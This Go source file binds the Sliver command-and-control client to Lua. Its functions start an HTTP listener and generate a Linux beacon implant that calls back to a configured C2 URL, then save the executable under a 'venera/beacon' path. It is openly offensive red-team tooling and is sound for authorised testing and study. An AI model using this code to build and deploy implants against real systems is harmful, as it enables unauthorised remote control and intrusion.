package wlua

import (
	"context"
	"math/rand"
	"os"
	"time"

	"github.com/bishopfox/sliver/client/assets"
	"github.com/bishopfox/sliver/client/transport"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/rpcpb"
	lua "github.com/yuin/gopher-lua"
	"google.golang.org/grpc"
)


type Adata struct {
	rpc rpcpb.SliverRPCClient
	ln *grpc.ClientConn
}

func SliverPreload(L *lua.LState) {
	L.PreloadModule("sliver", loader)
}

func loader(L *lua.LState) int {
	sliver_ud := L.NewTypeMetatable(`sliver_ud`)
	L.SetGlobal(`sliver_ud`, sliver_ud)
	L.SetField(sliver_ud, "__index", L.SetFuncs(L.NewTable(), map[string]lua.LGFunction{
		"listen": listen,
		"generate": generate,
	}))

	t := L.NewTable()
	L.SetFuncs(t, api)
	L.Push(t)
	return 1
}

var api = map[string]lua.LGFunction{
	"Open": newsliver,
}

func newsliver(L *lua.LState) int {
	conf, err := assets.ReadConfig(LuaProf.Globals["SLIVER_CFG"])
	if err != nil {
		L.Push(lua.LNil)
		L.Push(lua.LString(err.Error()))
		return 2
	}

	rpc, ln, err := transport.MTLSConnect(conf)
	if err != nil {
		L.Push(lua.LNil)
		L.Push(lua.LString(err.Error()))
		return 2
	}

	ud := L.NewUserData()
	t := &Adata{
		rpc: rpc,
		ln: ln,
	}

	ud.Value = t
	L.SetMetatable(ud, L.GetTypeMetatable("sliver_ud"))
	L.Push(ud)
	return 1
}

func listen(L *lua.LState) int {
	ud := L.CheckUserData(1)
	x := ud.Value.(*Adata)

	httpServer, err := x.rpc.StartHTTPListener(context.Background(), &clientpb.HTTPListenerReq{
		Host: L.ToString(2),
		Port: uint32(L.ToInt(3)),
	})
	if err != nil {
		L.Push(lua.LNil)
		L.Push(lua.LString(err.Error()))
		return 2
	}
	L.Push(lua.LNumber(httpServer.GetJobID()))
	return 1
}

func randstringbytes(n int) string {
	const letterBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    b := make([]byte, n)
    for i := range b {
        b[i] = letterBytes[rand.Intn(len(letterBytes))]
    }
    return string(b)
}

func generate(L *lua.LState) int {
	ud := L.CheckUserData(1)
	x := ud.Value.(*Adata)

	c2s := []*clientpb.ImplantC2{}
	c2s = append(c2s, &clientpb.ImplantC2{URL: "http://0.0.0.0:4444"})

	name := "vnr-"+randstringbytes(6)
	beacon, err := x.rpc.Generate(context.Background(), &clientpb.GenerateReq{
		Config: &clientpb.ImplantConfig{
			ObfuscateSymbols: false,
			Evasion: false,
			GOOS: "linux",
			GOARCH: "amd64",
			Debug: true,
			IsSharedLib: false,
			IsShellcode: false,
			IsBeacon: true,
			Format: clientpb.OutputFormat_EXECUTABLE,
			RunAtLoad: false,

			Name: name,
			FileName: name,
			
			ReconnectInterval: 15 * int64(time.Second),
			PollTimeout: 3 * int64(time.Second),
			BeaconInterval: 15 * int64(time.Second),
			BeaconJitter: 5 * int64(time.Second),

			C2: c2s,
		},
	})
	if err != nil {
		L.Push(lua.LNil)
		L.Push(lua.LString(err.Error()))
		return 2
	}

	beaconPath := LuaProf.Globals["home"]+"./venera/beacon/"+name
	err = os.WriteFile(beaconPath, beacon.File.Data, 0o700)
	if err != nil {
		L.Push(lua.LNil)
		L.Push(lua.LString(err.Error()))
		return 2
	}

	L.Push(lua.LString(beaconPath))
	return 1
}
